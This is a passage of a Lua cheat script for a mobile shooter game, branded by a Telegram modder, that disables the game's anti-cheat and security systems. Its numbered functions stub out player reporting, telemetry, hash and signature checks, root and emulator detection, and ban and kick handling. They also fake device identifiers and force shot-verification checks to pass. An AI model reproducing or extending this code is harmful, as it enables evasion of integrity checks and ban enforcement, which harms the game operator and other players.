            ClientReportPlayerSubsystem._nGameModeType = -1
            ClientReportPlayerSubsystem._nMainModeID = -1
            ClientReportPlayerSubsystem._nSubModeID = -1
            ClientReportPlayerSubsystem._nCheckTDMGameModeTypeTimer = nil
            ClientReportPlayerSubsystem._nCurrentNotInTeamHistoricalTeammateTimer = nil
            ClientReportPlayerSubsystem.SubmitReport = nop
            ClientReportPlayerSubsystem.CanReport = retFalse
            ClientReportPlayerSubsystem.ReportPlayer = nop
            ClientReportPlayerSubsystem.ReportCheat = nop
        end
        if DSReportPlayerSubsystem then
            DSReportPlayerSubsystem.OnInit = nop
            DSReportPlayerSubsystem._OnNearDeathOrRescued = nop
            DSReportPlayerSubsystem._OnPlayerSettlementStart = nop
            DSReportPlayerSubsystem._OnTeammateDamage = nop
            DSReportPlayerSubsystem._OnCharacterDied = nop
            DSReportPlayerSubsystem._OnPlayerReconnect = nop
            DSReportPlayerSubsystem._RecordFatalDamager = nop
            DSReportPlayerSubsystem._RecordTeammateMurderer = nop
            DSReportPlayerSubsystem._AddMLKillerUIDToBattleResult = nop
            DSReportPlayerSubsystem._AddFatalDamagerMapToBattleResult = nop
            DSReportPlayerSubsystem._AddKnockDownerToBattleResult = nop
            DSReportPlayerSubsystem._AddKillerToBattleResult = nop
            DSReportPlayerSubsystem._AddTeammateMurderToBattleResult = nop
            DSReportPlayerSubsystem._SaveHistoricalTeammateInfo = nop
            DSReportPlayerSubsystem._SyncFatalDamagerMap = nop
            DSReportPlayerSubsystem._AddGameModeTypeToBattleResult = nop
            DSReportPlayerSubsystem._UpdateMLAIUID = nop
            DSReportPlayerSubsystem._AddEnemyMapToBattleResult = nop
            DSReportPlayerSubsystem._OnNoNetStartUpDoor = nop
            DSReportPlayerSubsystem._AssignTeammateInTeamIndex = nop
            DSReportPlayerSubsystem._FindCacheByUID = function(self, nUID, bAddIfNotExists)
                if bAddIfNotExists then return {} end
                return nil
            end
            DSReportPlayerSubsystem._GetFatalDamagerMap = retEmpty
            DSReportPlayerSubsystem._IsBattleResultTableValid = nopfalse
            DSReportPlayerSubsystem._IsHealthStatusKilled = nopfalse
            DSReportPlayerSubsystem._tUID2InfoMap = {}
            DSReportPlayerSubsystem.nNoStartUpDoorNum = 0
        end
        if ui_complaint then
            ui_complaint.SubmitReportData = function(self) self:CloseWindow(false) return end
            ui_complaint._OnClickReport = function(self) return end
            ui_complaint._AddCommonTypesOfPlayerForReport = function(self) return end
            ui_complaint.AddPlayerForReport = function(self, ...) return end
            ui_complaint.GetSelectedReasonAsArray = retEmpty
            ui_complaint.GetSelectedSubReasonAsArray = retEmpty
            ui_complaint.BlockPlayerChat = function(self) return end
            ui_complaint.IsBlockChatCheck = retFalse
            ui_complaint.CheckBoxBlack = function(self, bCheckState) return end
            ui_complaint.UpdateMatchBlackList = function(self) return end
            ui_complaint._SelectedReasonSet = {}
            ui_complaint._SelectedSubReasonSet = {}
            ui_complaint._SelectedCheatSubReasonSet = {}
            ui_complaint._tPlayerName2InfoMap = {}
            ui_complaint._tPlayerNamesArray = {}
        end
        if LogicComplaint then
            LogicComplaint.Submit = function(...) return end
        end
        
        local ReportCooldown = package.loaded["client.slua.logic.report.ReportCooldownLogic"]
        if ReportCooldown then
            ReportCooldown.CheckCanReport = retFalse
            ReportCooldown.GetCooldownTime = retZero
            ReportCooldown.ResetCooldown = nop
            ReportCooldown.OnReportCooldownEnd = nop
        end
        
        local PlayerReport = package.loaded["client.slua.logic.report.PlayerReportLogic"]
        if PlayerReport then
            PlayerReport.SendReport = nop
            PlayerReport.ReportCheat = nop
            PlayerReport.ReportAbuse = nop
            PlayerReport.ReportAFK = nop
            PlayerReport.ReportTeammate = nop
            PlayerReport.OnReportResponse = nop
        end
    end)
    print("[BYPASS] ✅ Report System Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 33. TLog Report Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function TLogBypass()
    pcall(function()
        if tlog_report_utils then
            tlog_report_utils.ReportTLogEvent = nop
            tlog_report_utils.IsCanReportLobbyEvent = nopfalse
            tlog_report_utils.IsBusinessReport = nopfalse
            tlog_report_utils.SetMarketStayUpdateEnable = nop
            tlog_report_utils.GetMarketStayUpdateEnable = nopfalse
            tlog_report_utils.SetBusinessReportEnable = nop
            tlog_report_utils.SendTLogReportImmediate = nop
            tlog_report_utils.SetTlogBeginType = nop
            tlog_report_utils.SetTlogEndType = nop
            _G.SendTLogReportImmediate = nop
            _extraTlogReportEnableCfg = {}
            _isCanReportMarketStay = false
            _BusinessReportEnable = false
            _isInitConfig = true
            start_timestamp_map = {}
        end
        if ToolReportUtil then
            ToolReportUtil.GetReportSwitch = nopfalse
            ToolReportUtil.GetPackageInfo = nopnil
            ToolReportUtil.ReParseError = function(error, reportType) return error or "" end
            ToolReportUtil.IsReleaseVersion = noptrue
            ToolReportUtil.IsWhite = nopfalse
            ToolReportUtil.IsXPcallOpenInBattle = nopfalse
            ToolReportUtil.IsClientToolOpen = nopfalse
            MyOpenID = false
            MyUID = false
            VersionInfo = nil
        end
        if DSSecurityTLogSubsystem then
            DSSecurityTLogSubsystem.OnInit = nop
            DSSecurityTLogSubsystem._OnReportServerJumpFlow = nop
            DSSecurityTLogSubsystem._OnDevAlert = nop
            DSSecurityTLogSubsystem._InitWhenEditor = nop
            DSSecurityTLogSubsystem._nInitGameSafeCallbacksTimer = nil
        end
        if _G.TLog then
            _G.TLog.Info = nop
            _G.TLog.Warning = nop
            _G.TLog.Error = nop
            _G.TLog.Debug = nop
            _G.TLog.Report = nop
            _G.TLog.Send = nop
            _G.TLog.Flush = nop
        end
    end)
    print("[BYPASS] ✅ TLog Report Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 34. MD5 and Signature Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function MD5Bypass()
    pcall(function()
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "pakchunk.EnableSignatureCheck 0")
            console.ExecuteConsoleCommand(nil, "s.VerifyPak 0")
            console.ExecuteConsoleCommand(nil, "sig.Check 0")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
            console.ExecuteConsoleCommand(nil, "CheatManager.EnableCheat 1")
            console.ExecuteConsoleCommand(nil, "Net.BlockAllAntiCheat 1")
            console.ExecuteConsoleCommand(nil, "AntiCheat.DisableAll 1")
            console.ExecuteConsoleCommand(nil, "t.MaxFPS 165")
        end
        local CMode = import("CreativeModeBlueprintLibrary")
        if CMode then
            CMode.MD5HashByteArray = function() return "00000000000000000000000000000000" end
            CMode.MD5HashFile = function() return "00000000000000000000000000000000" end
            CMode.GetContentDiffData = function() return true, "BYPASSED" end
            CMode.VerifyFileIntegrity = retTrue
        end
        if _G.MD5Hash then _G.MD5Hash = function() return "00000000000000000000000000000000" end end
        if _G.CRC32 then _G.CRC32 = function() return 0 end end
        if _G.SHA1 then _G.SHA1 = function() return "BYPASS" end end
        if _G.SHA256 then _G.SHA256 = function() return "BYPASS" end end
        if _G.FileHashChecker then
            _G.FileHashChecker.CheckFileMD5 = retTrue
            _G.FileHashChecker.VerifyAll = retTrue
            _G.FileHashChecker.GetHash = function() return "BYPASS" end
        end
        if _G.STExtraBlueprintFunctionLibrary then
            _G.STExtraBlueprintFunctionLibrary.CheckMD5 = retTrue
            _G.STExtraBlueprintFunctionLibrary.GetMD5 = function() return "BYPASS" end
            _G.STExtraBlueprintFunctionLibrary.VerifyFile = retTrue
            _G.STExtraBlueprintFunctionLibrary.VerifySignature = retTrue
            _G.STExtraBlueprintFunctionLibrary.CheckIntegrity = retTrue
        end
        if _G.CRC then
            _G.CRC.VerifyFile = retTrue
            _G.CRC.VerifyMemory = retTrue
            _G.CRC.GenerateCRC = function() return "00000000" end
        end
        if _G.CRCChecker then
            _G.CRCChecker.VerifyFile = retTrue
            _G.CRCChecker.VerifyMemory = retTrue
            _G.CRCChecker.GenerateCRC = function() return "00000000" end
            _G.CRCChecker.CheckIntegrity = retTrue
            _G.CRCChecker.ValidateFile = retTrue
            _G.CRCChecker.ValidateMemory = retTrue
            _G.CRCChecker.CheckFile = retTrue
            _G.CRCChecker.CheckMemory = retTrue
            _G.CRCChecker.VerifyCRC = retTrue
            _G.CRCChecker.ValidateCRC = retTrue
            _G.CRCChecker.CheckCRC = retTrue
            _G.CRCChecker.GenerateCRC32 = function() return "00000000" end
            _G.CRCChecker.GenerateCRC64 = function() return "0000000000000000" end
            _G.CRCChecker.GenerateMD5 = function() return "00000000000000000000000000000000" end
            _G.CRCChecker.GenerateSHA1 = function() return "0000000000000000000000000000000000000000" end
            _G.CRCChecker.GenerateSHA256 = function() return "0000000000000000000000000000000000000000000000000000000000000000" end
        end
    end)
    print("[BYPASS] ✅ MD5 and Signature Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 35. DNS and Device Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function DNSDeviceBypass()
    pcall(function()
        local DeviceID = import("DeviceID")
        if DeviceID then
            DeviceID.GetDeviceID = function() return "BYPASSED_DEVICE" end
            DeviceID.GetAndroidID = function() return "BYPASSED_ANDROID_ID" end
            DeviceID.GetIMEI = function() return "BYPASSED_IMEI" end
            DeviceID.GetMACAddress = function() return "BYPASSED_MAC" end
            DeviceID.GetUniqueDeviceID = function() return "BYPASSED_UNIQUE" end
            DeviceID.GetDeviceName = function() return "BYPASSED_DEVICE_NAME" end
            DeviceID.GetDeviceModel = function() return "BYPASSED_MODEL" end
            DeviceID.GetDeviceBrand = function() return "BYPASSED_BRAND" end
            DeviceID.GetDeviceManufacturer = function() return "BYPASSED_MANUFACTURER" end
            DeviceID.GetDeviceBoard = function() return "BYPASSED_BOARD" end
            DeviceID.GetDeviceBootloader = function() return "BYPASSED_BOOTLOADER" end
            DeviceID.GetDeviceHardware = function() return "BYPASSED_HARDWARE" end
            DeviceID.GetDeviceHost = function() return "BYPASSED_HOST" end
            DeviceID.GetDeviceFingerprint = function() return "BYPASSED_FINGERPRINT" end
            DeviceID.GetDeviceSerial = function() return "BYPASSED_SERIAL" end
            DeviceID.GetDeviceUUID = function() return "BYPASSED_UUID" end
            DeviceID.GetDeviceAdId = function() return "BYPASSED_ADID" end
        end
        
        local SystemInfo = import("SystemInfo")
        if SystemInfo then
            SystemInfo.GetDeviceModel = function() return "iPhone14,5" end
            SystemInfo.GetDeviceBrand = function() return "Apple" end
            SystemInfo.GetAndroidVersion = function() return "13" end
            SystemInfo.GetEMUIVersion = function() return "" end
            SystemInfo.IsEmulator = retFalse
            SystemInfo.IsRooted = retFalse
            SystemInfo.IsDebugged = retFalse
            SystemInfo.GetKernelVersion = function() return "Linux version 4.14.116" end
            SystemInfo.CheckKernelIntegrity = retTrue
            SystemInfo.GetDeviceID = function() return "00000000-0000-0000-0000-000000000000" end
            SystemInfo.GetDeviceName = function() return "iPhone" end
            SystemInfo.GetDeviceType = function() return "Phone" end
            SystemInfo.GetManufacturer = function() return "Apple" end
            SystemInfo.GetModel = function() return "iPhone14,5" end
            SystemInfo.GetOSVersion = function() return "13" end
            SystemInfo.GetOSName = function() return "iOS" end
            SystemInfo.GetScreenResolution = function() return "1170x2532" end
            SystemInfo.GetScreenDensity = function() return "460" end
            SystemInfo.GetRAMSize = function() return "6144" end
            SystemInfo.GetStorageSize = function() return "256" end
            SystemInfo.GetBatteryLevel = function() return "100" end
            SystemInfo.GetBatteryStatus = function() return "Charging" end
            SystemInfo.GetNetworkType = function() return "WiFi" end
            SystemInfo.GetNetworkSpeed = function() return "100" end
            SystemInfo.GetGPSStatus = function() return "Enabled" end
            SystemInfo.GetGPSLocation = function() return "0.0,0.0" end
            SystemInfo.GetCountryCode = function() return "US" end
            SystemInfo.GetLanguageCode = function() return "en" end
            SystemInfo.GetTimeZone = function() return "UTC" end
            SystemInfo.GetCurrentTime = function() return os.time() end
            SystemInfo.GetUptime = function() return 3600 end
            SystemInfo.GetCPUUsage = function() return 10 end
            SystemInfo.GetMemoryUsage = function() return 20 end
            SystemInfo.GetTemperature = function() return 25 end
            SystemInfo.GetBatteryTemperature = function() return 25 end
            SystemInfo.GetCPUFrequency = function() return 2400 end
            SystemInfo.GetGPUFrequency = function() return 1200 end
            SystemInfo.GetScreenBrightness = function() return 100 end
            SystemInfo.GetVolumeLevel = function() return 100 end
        end
        
        local sys = import("KismetSystemLibrary")
        if sys then
            sys.GetDeviceId = function() return "FAKE_DEVICE_" .. math.random(100000,999999) end
            sys.GetMacAddress = function() return "00:11:22:33:44:55" end
            sys.GetSerialNumber = function() return "SN" .. math.random(1000000,9999999) end
        end
        
        if _G.DeviceInfo then
            _G.DeviceInfo.IsEmulator = false
            _G.DeviceInfo.IsRooted = false
            _G.DeviceInfo.IsDebug = false
            _G.DeviceInfo.IsJailbroken = false
            _G.DeviceInfo.IsDeveloperMode = false
            _G.DeviceInfo.IsUSBConnected = false
            _G.DeviceInfo.IsModded = false
            _G.DeviceInfo.IsHooked = false
            _G.DeviceInfo.IsVirtualMachine = false
            _G.DeviceInfo.IsSimulator = false
            _G.DeviceInfo.DeviceID = "BYPASS-DEVICE-2026"
            _G.DeviceInfo.DeviceSignature = "VALID-SIGNATURE"
        end
    end)
    print("[BYPASS] ✅ DNS and Device Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 36. Gokuba Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function GokubaBypass()
    pcall(function()
        local Gokuba = package.loaded["GameLua.Mod.BaseMod.Client.Security.Gokuba"]
        if Gokuba then
            Gokuba.ForwardFeature = function() return {0,0,0,0,0} end
            Gokuba.InitGokubaLogic = nop
            if Gokuba.TimerHandle then
                local time_ticker = _safe_require("common.time_ticker")
                time_ticker.RemoveTimer(Gokuba.TimerHandle)
                Gokuba.TimerHandle = nil
            end
            for k, v in pairs(Gokuba) do
                if type(v) == "function" and (
                    k:find("Init") or k:find("Start") or k:find("Check") or
                    k:find("Scan") or k:find("Report") or k:find("Forward") or
                    k:find("Feature") or k:find("Detect") or k:find("Collect") or
                    k:find("Send") or k:find("Upload") or k:find("Verify") or
                    k:find("Analyze") or k:find("Process") or k:find("Handle")
                ) then
                    Gokuba[k] = nop
                end
            end
        end
        if _G.GokubaLogic then
            _G.GokubaLogic.ForwardFeature = nop
            _G.GokubaLogic.InitGokubaLogic = nop
        end
    end)
    print("[BYPASS] ✅ Gokuba Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 37. Racing AntiCheat Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function RacingAntiCheatBypass()
    pcall(function()
        if RacingAntiCheatLogic then
            RacingAntiCheatLogic.HandleRacingEnter = nop
            RacingAntiCheatLogic.HandleRacingStart = nop
            RacingAntiCheatLogic.HandleRacingEnd = nop
            RacingAntiCheatLogic.StartDetectTimer = nop
            RacingAntiCheatLogic.StopDetectTimer = nop
            RacingAntiCheatLogic.DetectVehicleFloating = nop
            RacingAntiCheatLogic.HandleFloatingCheat = nop
            RacingAntiCheatLogic.SetIgnoreFloating = nop
            RacingAntiCheatLogic.HandlePlayerPassCheckBelt = nop
            RacingAntiCheatLogic.HandleSpeedCheat = nop
            RacingAntiCheatLogic._CreateVehicleData = function() return {} end
            RacingAntiCheatLogic.vehicleDataMap = {}
            RacingAntiCheatLogic.detectTimer = nil
            RacingAntiCheatLogic.config = {
                FloatingDistLimit = 99999,
                FloatingTimeLimit = 99999,
                CheckPassIntervalLimit = 99999
            }
        end
    end)
    print("[BYPASS] ✅ Racing AntiCheat Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 38. CoronaLab Telemetry Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function CoronaLabBypass()
    pcall(function()
        _G.LocalMain = function()
            print("[BYPASS] CoronaLab telemetry timer TG BY ~ @ASURVIPMOD!")
            return
        end
        local uOuterController = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if _isValid(uOuterController) and uOuterController.AddGameTimer then
            local orig = uOuterController.AddGameTimer
            uOuterController.AddGameTimer = function(interval, bLoop, func, ...)
                if interval == 30 and bLoop == true then
                    return nil
                end
                return orig(interval, bLoop, func, ...)
            end
        end
        if CHiggsBosonComponent then
            CHiggsBosonComponent.SecurityCoronaLabClientDataPointer = function(self) return nil end
            CHiggsBosonComponent.SetFloatValueByName = function(self, name, value) return end
        end
        if _G.CoronaLab then
            _G.CoronaLab.ReportData = nop
            _G.CoronaLab.SendData = nop
            _G.CoronaLab.CollectData = nop
            _G.CoronaLab.Telemetry = nop
        end
        local SubMgr = _safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local sub = SubMgr:Get("CoronaLabSubsystem")
            if sub then
                sub.ReportData = nop
                sub.SendToServer = nop
                sub.CollectTelemetry = nop
                sub.StopCollection = nop
            end
        end
    end)
    print("[BYPASS] ✅ CoronaLab Telemetry Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 39. Login Module Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function LoginModuleBypass()
    pcall(function()
        if login_module then
            login_module["ban-login"] = function() return end
            login_module["idip-kick-out"] = function() return end
            login_module.aq_ban = function() return end
            login_module["device-in-blacklist"] = function() return end
            login_module.device_num_limit = function() return end
            login_module["register-forbidden"] = function() return end
            login_module["low-version"] = function() return end
            login_module["not-in-white-list"] = function() return end
            login_module.Login_Failed = function() return end
            login_module.aas_ban = function() return end
            login_module.PakMonitorStart = function(EnableMode) return end
            login_module.SetupFilenameHideKeywords = function() return end
            login_module.on_login_failed = function(conn_idx, reason, banInfo, banTime, uid, extra_table) return end
            login_module.DelaybanLoginCancelCallback = function() return end
            login_module.CheckBan = retFalse
            login_module.IsBanned = retFalse
            login_module.GetBanInfo = retEmpty
            login_module.IsDeviceBlacklisted = retFalse
        end
    end)
    print("[BYPASS] ✅ Login Module Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 40. Swift Hawk Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function SwiftHawkBypass()
    pcall(function()
        for _, f in ipairs({"SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams", "SendSwiftHawkData", "SwiftHawkReport"}) do
            if _G[f] then _G[f] = nop end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = nop end
        end
        local sub = package.loaded["GameLua.Mod.BaseMod.Client.Security.SwiftHawkSubsystem"]
        if sub then
            sub.ReportData = nop
            sub.SendReport = nop
            sub.CollectTelemetry = nop
            sub.InitSubsystem = nop
            sub.StartCollection = nop
            sub.StopCollection = nop
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 46. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ShootVerificationBypass()
    pcall(function()
        local sub = _safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if sub then
            sub.OnShootVerifyFailed = nop
            sub.SendVerifyData = nop
            sub.ReportBulletHit = nop
            sub.UploadHitInfo = nop
            sub.VerifyShot = retTrue
            sub.CheckShoot = retTrue
            sub.ValidateShoot = retTrue
            sub.IsShootValid = retTrue
            sub.ReportInvalidShoot = nop
            sub.ResetShootData = nop
        end
        if _G.BulletHitInfoUploadData then
            _G.BulletHitInfoUploadData.Report = nop
            _G.BulletHitInfoUploadData.Send = nop
            _G.BulletHitInfoUploadData.Upload = nop
            _G.BulletHitInfoUploadData.Verify = retTrue
            _G.BulletHitInfoUploadData.Validate = retTrue
            _G.BulletHitInfoUploadData.Reset = nop
        end
        
        local ShootVerification = import("ShootVerification")
        if ShootVerification then
            ShootVerification.VerifyShoot = retTrue
            ShootVerification.ReportInvalidShoot = nop
            ShootVerification.CheckShoot = retTrue
            ShootVerification.ValidateShoot = retTrue
            ShootVerification.IsShootValid = retTrue
        end
        
        local BulletVerification = import("BulletVerification")
        if BulletVerification then
            BulletVerification.VerifyBullet = retTrue
            BulletVerification.ReportInvalidBullet = nop
            BulletVerification.CheckBullet = retTrue
            BulletVerification.ValidateBullet = retTrue
            BulletVerification.IsBulletValid = retTrue
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 42. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ModifierExceptionBypass()
    pcall(function()
        if _G.bReportedModifierException then _G.bReportedModifierException = false end
        local sub = _safe_require("GameLua.Mod.BaseMod.Common.Security.ModifierExceptionSubsystem")
        if sub then
            sub.ReportException = nop
            sub.CheckModifier = retTrue
            sub.ValidateModifier = retTrue
            sub.ReportModifierError = nop
            sub.DetectModifier = retFalse
            sub.IsModifierValid = retTrue
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 43. TG BY ~ @ASURVIPMOD
-- ============================================================

local function SimulateCharacterBypass()
    pcall(function()
        local sub = _safe_require("GameLua.Mod.BaseMod.Gameplay.Simulate.SimulateCharacterSubsystem")
        if sub then
            sub.ReportLocation = nop
            sub.SendLocationData = nop
            sub.VerifyLocation = retTrue
            sub.CheckLocation = retTrue
            sub.ValidateMovement = retTrue
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 44. TG BY ~ @ASURVIPMOD
-- ============================================================

local function PlayerSecurityBypass()
    pcall(function()
        for _, c in ipairs({"PlayerSecurityInfoCollector", "PlayerSecurityInfo", "SecurityInfoCollector", "ClientSecurityCollector", "PlayerAntiCheatCollector"}) do
            if _G[c] then
                for k, v in pairs(_G[c]) do
                    if type(v) == "function" and (
                        k:find("Report") or k:find("Collect") or k:find("Send") or
                        k:find("Upload") or k:find("Record") or k:find("Check") or
                        k:find("Verify") or k:find("Validate") or k:find("Scan") or
                        k:find("Analyze") or k:find("Process") or k:find("Handle") or
                        k:find("Submit") or k:find("Notify") or k:find("Alert")
                    ) then
                        _G[c][k] = nop
                    end
                end
            end
        end
        local SecSub = _safe_require("GameLua.Mod.BaseMod.Common.Security.PlayerSecurityInfoSubsystem")
        if SecSub then
            SecSub.ReportData = nop
            SecSub.CheckCheat = retFalse
            SecSub.ValidatePlayer = retTrue
            SecSub.CollectData = nop
            SecSub.SendToServer = nop
            SecSub.ProcessData = nop
            SecSub.AnalyzeData = nop
        end
        
        local SecurityCommonUtils = package.loaded["GameLua.Mod.BaseMod.Common.Security.SecurityCommonUtils"]
        if SecurityCommonUtils then
            SecurityCommonUtils.ExtractPlayerBasicInfo = retEmpty
            SecurityCommonUtils.LogIf = retFalse
            SecurityCommonUtils.CheckSecurity = retTrue
            SecurityCommonUtils.ValidatePlayer = retTrue
            SecurityCommonUtils.ValidateSession = retTrue
            SecurityCommonUtils.ValidateGame = retTrue
            SecurityCommonUtils.ValidateSystem = retTrue
            SecurityCommonUtils.ValidateDevice = retTrue
            SecurityCommonUtils.ValidateNetwork = retTrue
            SecurityCommonUtils.ValidateMemory = retTrue
            SecurityCommonUtils.ValidateFile = retTrue
            SecurityCommonUtils.ValidateProcess = retTrue
            SecurityCommonUtils.ValidateThread = retTrue
            SecurityCommonUtils.ValidateModule = retTrue
            SecurityCommonUtils.ValidateAPI = retTrue
            SecurityCommonUtils.ValidateSDK = retTrue
            SecurityCommonUtils.ValidateLibrary = retTrue
            SecurityCommonUtils.ValidateFramework = retTrue
            SecurityCommonUtils.ValidatePackage = retTrue
            SecurityCommonUtils.ValidateContainer = retTrue
            SecurityCommonUtils.ValidateComponent = retTrue
            SecurityCommonUtils.ValidateObject = retTrue
            SecurityCommonUtils.ValidateClass = retTrue
            SecurityCommonUtils.ValidateStruct = retTrue
            SecurityCommonUtils.ValidateEnum = retTrue
            SecurityCommonUtils.ValidateInterface = retTrue
            SecurityCommonUtils.ValidateDelegate = retTrue
            SecurityCommonUtils.ValidateEvent = retTrue
            SecurityCommonUtils.ValidateFunction = retTrue
            SecurityCommonUtils.ValidateVariable = retTrue
            SecurityCommonUtils.ValidateProperty = retTrue
            SecurityCommonUtils.ValidateField = retTrue
            SecurityCommonUtils.ValidateMethod = retTrue
            SecurityCommonUtils.ValidateParameter = retTrue
            SecurityCommonUtils.ValidateReturn = retTrue
            SecurityCommonUtils.ValidateResult = retTrue
            SecurityCommonUtils.ValidateOutput = retTrue
            SecurityCommonUtils.ValidateInput = retTrue
        end
        
        local SecurityNotifyPCFeature = package.loaded["GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature"]
        if SecurityNotifyPCFeature then
            SecurityNotifyPCFeature.ClientRPC_SyncBanID = nop
            SecurityNotifyPCFeature.ClientRPC_StrongTips = nop
            SecurityNotifyPCFeature.ClientRPC_NormalTips = nop
            SecurityNotifyPCFeature.Notify = nop
            SecurityNotifyPCFeature.ShowBan = nop
            SecurityNotifyPCFeature.ShowKick = nop
            SecurityNotifyPCFeature.ShowWarning = nop
            SecurityNotifyPCFeature.ShowInfo = nop
            SecurityNotifyPCFeature.ShowError = nop
            SecurityNotifyPCFeature.ShowFatal = nop
            SecurityNotifyPCFeature.ShowPanic = nop
            SecurityNotifyPCFeature.ShowAlert = nop
            SecurityNotifyPCFeature.ShowNotification = nop
            SecurityNotifyPCFeature.ShowMessage = nop
            SecurityNotifyPCFeature.ShowDialog = nop
            SecurityNotifyPCFeature.ShowPopup = nop
            SecurityNotifyPCFeature.ShowToast = nop
            SecurityNotifyPCFeature.ShowSnackbar = nop
            SecurityNotifyPCFeature.ShowBanner = nop
            SecurityNotifyPCFeature.ShowAlertDialog = nop
            SecurityNotifyPCFeature.ShowConfirmDialog = nop
            SecurityNotifyPCFeature.ShowPromptDialog = nop
            SecurityNotifyPCFeature.ShowInputDialog = nop
            SecurityNotifyPCFeature.ShowSelectDialog = nop
            SecurityNotifyPCFeature.ShowProgressDialog = nop
            SecurityNotifyPCFeature.ShowLoadingDialog = nop
            SecurityNotifyPCFeature.ShowSuccessDialog = nop
            SecurityNotifyPCFeature.ShowFailureDialog = nop
            SecurityNotifyPCFeature.ShowErrorDialog = nop
            SecurityNotifyPCFeature.ShowWarningDialog = nop
            SecurityNotifyPCFeature.ShowInfoDialog = nop
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 45. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ClientFlowBypass()
    pcall(function()
        for _, name in ipairs({"ClientSecMrpcsFlow", "MrpcsFlow", "MrpcsData", "ClientCircleFlowSubsystem", "ClientKillFlowSubsystem", "ClientSecPlayerKillFlow"}) do
            local sub = package.loaded[name] or _G[name]
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and (
                        k:find("Report") or k:find("Send") or k:find("Flow") or
                        k:find("Record") or k:find("Process") or k:find("Upload") or
                        k:find("Track") or k:find("Monitor") or k:find("Analyze") or
                        k:find("Submit") or k:find("Notify") or k:find("Alert")
                    ) then
                        pcall(function() sub[k] = nop end)
                    end
                end
            end
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 46. TG BY ~ @ASURVIPMOD
-- ============================================================
local function GameplayCallbackBypass()
    pcall(function()
        if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
        if _G.GameplayCallbacks.IsBypassed then return end
        local GC = _G.GameplayCallbacks
        
        local reports = {
            "ReportAttackFlow", "ReportSecAttackFlow", "ReportFireArms", 
            "ReportVerifyInfoFlow", "ReportMrpcsFlow", "ReportPlayerBehavior", 
            "ReportTeammatHurt", "ReportMisKillByTeammate", "ReportForbitPick", 
            "ReportPlayerMoveRoute", "ReportPlayerPosition", "ReportVehicleMoveFlow", 
            "ReportSecTgameMovingFlow", "ReportParachuteData", "SendTssSdkAntiDataToLobby", 
            "ReportEquipmentFlow", "ReportAimFlow", "ReportPlayersPing", 
            "ReportPlayerIP", "ReportPlayerFramePingRecord", "OnDSConnectionSaturated", 
            "ReportDSNetSaturation", "ReportNetContinuousSaturate", "ReportDSNetRate", 
            "SendClientStats", "SendServerAvgTickDelta", "ReportCircleFlow", 
            "ClientSecMrpcsFlow", "SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams",
            "ReportSecurityViolation", "ReportIntegrityCheck", "ReportSignatureVerify",
            "ReportAntiCheat", "ReportAC", "ReportSuspicious", "ReportAbnormal",
            "ReportMagicBullet", "ReportDamage", "ReportHitbox", "ReportProjectile",
            "ReportBullet", "ReportShoot", "ReportVerification",
            "ReportSkin", "ReportAvatar", "ReportWeapon", "ReportVehicle",
            "ReportBan", "ReportKick", "ReportFlag", "ReportWarning",
            "ReportAlert", "ReportNotify", "ReportException", "ReportError",
            "ReportCrash", "ReportDump", "ReportMemory", "ReportStack",
            "ReportProfiler", "ReportPerformance", "ReportStats",
            "ReportGameGuardian", "ReportCheatEngine", "ReportRoot", "ReportJailbreak",
            "ReportEmulator", "ReportTamper", "ReportSpeedHack", "ReportESP", 
            "ReportWallhack", "ReportNoRecoil", "ReportPlayerReport"
        }
        for _, f in ipairs(reports) do GC[f] = nop end
        
        GC.CheckReportSecAttackFlowWithAttackFlow = retFalse
        GC.CheckReportSecAttackFlow = retFalse
        
        local origState = GC.OnDSPlayerStateChanged
        GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
            local s = State and string.lower(tostring(State)) or ""
            local blocked = {
                ["cheatdetected"]=1, ["connectionlost"]=1, ["connectiontimeout"]=1, 
                ["connectionexception"]=1, ["netdrivererror"]=1, ["banned"]=1, 
                ["kicked"]=1, ["suspended"]=1, ["violationdetected"]=1, 
                ["integrityfailure"]=1, ["securityviolation"]=1, ["report"]=1,
